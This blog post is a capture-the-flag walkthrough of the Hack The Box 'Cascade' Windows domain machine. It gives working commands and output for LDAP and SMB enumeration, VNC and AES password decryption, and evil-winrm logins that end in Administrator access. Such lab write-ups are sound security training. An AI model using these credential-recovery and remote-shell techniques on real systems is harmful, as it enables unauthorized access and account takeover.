---
layout: post
title:  "Hack The Box - Cascade"
date:   2020-07-26 13:28:00 +0800
categories: hackthebox smb windows 
---

![](/assets/images/cascade.png){:height="414px" width="615px"}

# Configuration

The operating systems that I will be using to tackle this machine is a Kali Linux VM and a FlareVM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

{% highlight bash %}
$ echo "10.10.10.182 cascade.htb" >> /etc/hosts
{% endhighlight %}

# Reconnaissance

Using `nmap`, we are able to determine the open ports and running services on the machine.
{% highlight bash %}
$ nmap -sV -sT -sC cascade.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 04:22 EDT
Nmap scan report for cascade.htb (10.10.10.182)
Host is up (0.18s latency).
Not shown: 987 filtered ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-10 08:25:23Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 2m52s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-10T08:26:15
|_  start_date: 2020-04-10T07:50:40

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 227.43 seconds

{% endhighlight %}

# Enumeration (1)

Seeing that the box belongs to the `cascade.local` domain, we will append it to our `/etc/hosts`.

{% highlight bash %}
$ cat /etc/hosts
...
10.10.10.182 cascade.htb cascade.local
{% endhighlight %}

Seeing that `ldap` service is running on port `389`, we will use `ldapsearch`.

{% highlight bash %}
$ ldapsearch -x -h cascade.local -b "dc=cascade,dc=local"
...
cascadeLegacyPwd: clk0bjVldmE=
{% endhighlight %}

After eye-balling for a while, I saw a peculiar "cascadeLegacyPwd" which seems to be in `base64. Decoding it reveals "rY4n5eva"

This field was under a user called "r.thompson". Perhaps this password is still being in used? We can use the `smb` service to verify.

{% highlight bash %}
$ smbmap -H cascade.local -d cascade.local -u r.thompson -p rY4n5eva
[+] Finding open SMB ports....
[+] User SMB session established on cascade.local...
[+] IP: cascade.local:445       Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        Audit$                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        .                                                  
        dr--r--r--                0 Tue Jan 28 17:05:51 2020    .
        dr--r--r--                0 Tue Jan 28 17:05:51 2020    ..
        dr--r--r--                0 Sun Jan 12 20:45:14 2020    Contractors
        dr--r--r--                0 Sun Jan 12 20:45:10 2020    Finance
        dr--r--r--                0 Tue Jan 28 13:04:51 2020    IT
        dr--r--r--                0 Sun Jan 12 20:45:20 2020    Production
        dr--r--r--                0 Sun Jan 12 20:45:16 2020    Temps
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        .                                                  
        dr--r--r--                0 Wed Jan 15 16:50:33 2020    .
        dr--r--r--                0 Wed Jan 15 16:50:33 2020    ..
        fr--r--r--              258 Wed Jan 15 16:50:14 2020    MapAuditDrive.vbs
        fr--r--r--              255 Wed Jan 15 16:51:03 2020    MapDataDrive.vbs
        NETLOGON                                                READ ONLY       Logon server share 
        .                                                  
        dr--r--r--                0 Thu Jan  9 18:06:29 2020    .
        dr--r--r--                0 Thu Jan  9 18:06:29 2020    ..
        dr--r--r--                0 Thu Jan  9 18:06:29 2020    color
        dr--r--r--                0 Thu Jan  9 18:06:29 2020    IA64
        dr--r--r--                0 Thu Jan  9 18:06:29 2020    W32X86
        dr--r--r--                0 Sun Jan 12 22:09:11 2020    x64
        print$                                                  READ ONLY       Printer Drivers
        .                                                  
        dr--r--r--                0 Thu Jan  9 10:31:27 2020    .
        dr--r--r--                0 Thu Jan  9 10:31:27 2020    ..
        dr--r--r--                0 Thu Jan  9 10:31:27 2020    cascade.local
        SYSVOL                                                  READ ONLY       Logon server share 
{% endhighlight %}

As `r.thompson`, we are only able to read from `Data`, `NETLOGON`, `print$` and `SYSVOL`. Time to start digging around!



{% highlight bash %}
$ smbclient //cascade.local/Data -U r.thompson
Enter WORKGROUP\r.thompson's password: 
Try "help" to get a list of possible commands.
...
smb: \IT\Temp\s.smith\> dir
  .                                   D        0  Tue Jan 28 15:00:01 2020
  ..                                  D        0  Tue Jan 28 15:00:01 2020
  VNC Install.reg                     A     2680  Tue Jan 28 14:27:44 2020

                13106687 blocks of size 4096. 7792770 blocks available
smb: \IT\Temp\s.smith\> get "VNC Install.reg"
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)               
{% endhighlight %}

In `\IT\Temp\s.smith\` was a file called `VNC Install.reg`. After downloading and reading it, we see something interesting.

{% highlight bash %}
$ cat "VNC Install.reg"
...
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
{% endhighlight %}

This password can be decoded by using `msfconsole`.

{% highlight bash %}
$ msfconsole
msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object
>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
=> "\u0017Rk\u0006#NX\a"
>> require 'rex/proto/rfb'
=> true
>> Rex::Proto::RFB::Cipher.decrypt ["6BCF2A4B6E5ACA0F"].pack('H*'), fixedkey
=> "sT333ve2"
{% endhighlight %}

Since the file was found in a directory belonging `s.smith`, we assume that this is his password. Lets test it out. 

{% highlight bash %}
$ smbmap -H cascade.local -d cascade.local -u s.smith -p sT333ve2
[+] Finding open SMB ports....
[+] User SMB session established on cascade.local...
[+] IP: cascade.local:445       Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        .                                                  
        dr--r--r--                0 Wed Jan 29 13:01:26 2020    .
        dr--r--r--                0 Wed Jan 29 13:01:26 2020    ..
        fr--r--r--            13312 Tue Jan 28 16:47:08 2020    CascAudit.exe
        fr--r--r--            12288 Wed Jan 29 13:01:26 2020    CascCrypto.dll
        dr--r--r--                0 Tue Jan 28 16:43:18 2020    DB
        fr--r--r--               45 Tue Jan 28 18:29:47 2020    RunAudit.bat
        fr--r--r--           363520 Tue Jan 28 15:42:18 2020    System.Data.SQLite.dll
        fr--r--r--           186880 Tue Jan 28 15:42:18 2020    System.Data.SQLite.EF6.dll
        dr--r--r--                0 Tue Jan 28 15:42:18 2020    x64
        dr--r--r--                0 Tue Jan 28 15:42:18 2020    x86
        Audit$                                                  READ ONLY
...
{% endhighlight %}

Using `s.smith`, we now have access to an additional share `Audit$`. Wait, we haven't found `user.txt`?

# user.txt

Running a second `nmap` scan but with all ports reveals an additional service we can use: `winrm` on port `5985`. Using [`evil-winrm`](https://github.com/Hackplayers/evil-winrm),

{% highlight bash %}
$ ruby evil-winrm.rb -i cascade.local -u s.smith -p sT333ve2
Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\s.smith\Documents> type ../Desktop/user.txt
003fXXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

# Enumeration (2)

Back to the `Audit$` share, there were quite a few interesting files. After downloading all the files, I first checked out `\DB\Audit.db`.

{% highlight bash %}
$ file Audit.db 
Audit.db: SQLite 3.x database, last written using SQLite version 3027002
{% endhighlight %}

Fortunately, Kali Linux comes pre-installed with a SQLite Database browser.

![](/assets/images/cascade1.png)

After loading `Audit.db` into the browser, you should see 4 tables.

![](/assets/images/cascade2.png)

There were mainly 2 interesting tables:

`DeletedUserAudit`:

![](/assets/images/cascade3.png)

`Ldap`:

![](/assets/images/cascade4.png)

It seems like we found a username `ArkSvc` and its password which appears to be in base64. However, decoding it doesn't return any readable password. :(

The next file I checked was `RunAudit.bat`.

{% highlight bash %}
$ cat RunAudit.bat
CascAudit.exe "\\CASC-DC1\Audit$\DB\Audit.db"
{% endhighlight %}

Hmm... This batch script is runnig `CascAudit.exe` and using `Audit.db` as a command line argument. Perhaps it is writing/reading from it? Lets check out `CascAudit.exe` next.

{% highlight bash %}
$ file CascAudit.exe 
CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
{% endhighlight %}

Fortunately, it was written in `.NET`, meaning we can decompile it to obtain its original source code! I will be transferring `CascAudit.exe` to my FlareVM, which has `ILSpy` installed. 

`CascAudit.exe`:

{% highlight dotnet %}
...
sQLiteConnection.Open();
SQLiteCommand sQLiteCommand = new SQLiteCommand("SELECT * FROM LDAP", sQLiteConnection);
try
{
        SQLiteDataReader sQLiteDataReader = sQLiteCommand.ExecuteReader();
        try
        {
                sQLiteDataReader.Read();
                str = Conversions.ToString(sQLiteDataReader["Uname"]);
                str2 = Conversions.ToString(sQLiteDataReader["Domain"]);
                string encryptedString = Conversions.ToString(sQLiteDataReader["Pwd"]);
                try
                {
                        password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
                }
                catch (Exception ex)
                {
                        ProjectData.SetProjectError(ex);
                        Exception ex2 = ex;
                        Console.WriteLine("Error decrypting password: " + ex2.Message);
                        ProjectData.ClearProjectError();
                        return;
                }
        }
...
{% endhighlight %}

In this code segment, it is attempting to select records from the `LDAP` table and decrypt the encrypted string in the "Pwd" column with a hard-coded key `c4scadek3y654321`. The decrypt function used was from a custom class called `Crypto`, which was in another file in the `Audit$` share called `CascCrypto.dll`. Opening it up with `ILSpy`,

`CascCrypto.dll`:

{% highlight dotnet %}
public class Crypto
{
	public const string DefaultIV = "1tdyjCbY1Ix49842";

	public const int Keysize = 128;

	public static string EncryptString(string Plaintext, string Key)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(Plaintext);
		Aes aes = Aes.Create();
		aes.BlockSize = 128;
		aes.KeySize = 128;
		aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
		aes.Key = Encoding.UTF8.GetBytes(Key);
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytes, 0, bytes.Length);
				cryptoStream.FlushFinalBlock();
			}
			return Convert.ToBase64String(memoryStream.ToArray());
		}
	}

	public static string DecryptString(string EncryptedString, string Key)
	{
		//Discarded unreachable code: IL_009e
		byte[] array = Convert.FromBase64String(EncryptedString);
		Aes aes = Aes.Create();
		aes.KeySize = 128;
		aes.BlockSize = 128;
		aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
		aes.Mode = CipherMode.CBC;
		aes.Key = Encoding.UTF8.GetBytes(Key);
		using (MemoryStream stream = new MemoryStream(array))
		{
			using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read))
			{
				byte[] array2 = new byte[checked(array.Length - 1 + 1)];
				cryptoStream.Read(array2, 0, array2.Length);
				return Encoding.UTF8.GetString(array2);
			}
		}
	}
}
{% endhighlight %}

To decrypt the encrypted password in the `Audit.db`, we can simply just make use of the `DecryptString` method that was already implemented for us. I am not well-versed on how to setup an environment for `.NET` but I know there are websites like [this](https://dotnetfiddle.net/) that allows you run any `.NET` code ! :)

This is how my final code looks like:

{% highlight dotnet %}
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
					
public class Program
{	
	public static string DecryptString(string EncryptedString, string Key)
	{
		//Discarded unreachable code: IL_009e
		byte[] array = Convert.FromBase64String(EncryptedString);
		Aes aes = Aes.Create();
		aes.KeySize = 128;
		aes.BlockSize = 128;
		aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
		aes.Mode = CipherMode.CBC;
		aes.Key = Encoding.UTF8.GetBytes(Key);
		using (MemoryStream stream = new MemoryStream(array))
		{
			using (CryptoStream cryptoStream = new CryptoStream(stream, aes.CreateDecryptor(), CryptoStreamMode.Read))
			{
				byte[] array2 = new byte[checked(array.Length - 1 + 1)];
				cryptoStream.Read(array2, 0, array2.Length);
				return Encoding.UTF8.GetString(array2);
			}
		}
	}
	public static void Main()
	{
		Console.WriteLine(DecryptString("BQO5l5Kj9MdErXx6Q6AGOw==", "c4scadek3y654321"));
	}
}
{% endhighlight %}

After executing, we get the output `w3lc0meFr31nd`.

Using [`evil-winrm`](https://github.com/Hackplayers/evil-winrm) again, we establish a shell as `ArkSvc`.

{% highlight bash %}
$ ruby evil-winrm.rb -i cascade.local -u ArkSvc -p w3lc0meFr31nd

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\arksvc\Documents> 
{% endhighlight %}

Going back to the `Data` share, there was a file `Meeting_Notes_June_2018.html` in `\IT\Email Archives\`:

{% highlight raw %}
...
<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
...
{% endhighlight %}

Hmm... If we can somehow recover `TempAdmin`, we might be able to get the password of the `Administrator` account!

Lets see if we can retrieve information about deleted objects!

{% highlight raw %}
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -properties *
...
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
...
{% endhighlight %}

Like `r.thompson`, `TempAdmin` had a `cascadeLegacyPwd`, which is `baCT3r1aN00dles` when decoded!

# root.txt

Using [`evil-winrm`](https://github.com/Hackplayers/evil-winrm) for the final time, we finally get our flag!

{% highlight bash %}
$ ruby evil-winrm.rb -i cascade.local -u Administrator -p baCT3r1aN00dles
Evil-WinRM shell v2.3                                                                                                                
                                                                                                                                     
Info: Establishing connection to remote endpoint                                                                                     
                                                                                                                                         
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
f9f8XXXXXXXXXXXXXXXXXXXXXXXXXXXX
{% endhighlight %}

Rooted ! Thank you for reading and look forward for more writeups and articles !